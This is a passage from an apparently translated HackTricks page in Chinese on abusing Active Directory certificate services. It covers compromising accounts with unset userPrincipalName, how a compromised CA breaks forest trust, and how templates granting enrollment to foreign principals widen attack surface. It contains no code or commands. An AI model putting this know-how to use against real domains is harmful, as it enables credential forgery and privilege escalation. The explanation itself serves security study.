或者，我们也可以妥协任何没有设置 `userPrincipalName` 或 `userPrincipalName` 与该账户的 `sAMAccountName` 不匹配的用户账户。根据我自己的测试，默认域管理员 `Administrator@corp.local` 默认没有设置 `userPrincipalName`，而且这个账户默认在 LDAP 中应该比域控制器有更多权限。

## 使用证书妥协森林

### CA 信任破坏森林信任

**跨森林注册**的设置相对简单。管理员将资源森林的 **根 CA 证书** 发布 **到账户森林**，并将资源森林的 **企业 CA** 证书添加到 **`NTAuthCertificates`** 和 AIA 容器 **在每个账户森林中**。明确地说，这意味着资源森林中的 **CA** 对其管理 PKI 的所有 **其他森林** 拥有 **完全控制权**。如果攻击者 **妥协了这个 CA**，他们可以 **伪造资源和账户森林中所有用户的证书**，破坏森林安全边界。

### 具有注册权限的外部主体

在多森林环境中，组织需要注意的另一件事是企业 CA **发布证书模板**，授予 **已认证用户或外部主体**（属于企业 CA 所在森林之外的用户/组）**注册和编辑权限**。\
当账户 **跨信任认证** 时，AD 将 **已认证用户 SID** 添加到认证用户的令牌中。因此，如果一个域有一个企业 CA，其模板 **授予已认证用户注册权限**，不同森林中的用户可能会 **注册该模板**。类似地，如果模板明确授予 **外部主体注册权限**，那么就会创建 **跨森林访问控制关系**，允许一个森林中的主体 **在另一个森林中注册模板**。

最终，这两种情况都会 **增加从一个森林到另一个森林的攻击面**。根据证书模板的设置，攻击者可以滥用这一点在外部域中获得额外的权限。

## 参考资料

* 本页的所有信息取自 [https://www.specterops.io/assets/resources/Certified\_Pre-Owned.pdf](https://www.specterops.io/assets/resources/Certified\_Pre-Owned.pdf)

<details>

<summary><strong>从零开始学习 AWS 黑客攻击到高手</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS 红队专家)</strong></a><strong>！</strong></summary>

支持 HackTricks 的其他方式：

* 如果您想在 **HackTricks 中看到您的公司广告** 或 **下载 HackTricks 的 PDF** 版本，请查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取 [**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* 发现 [**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们独家的 [**NFTs**](https://opensea.io/collection/the-peass-family) 收藏
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或在 **Twitter** 🐦 上 **关注** 我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来分享您的黑客技巧。

</details>
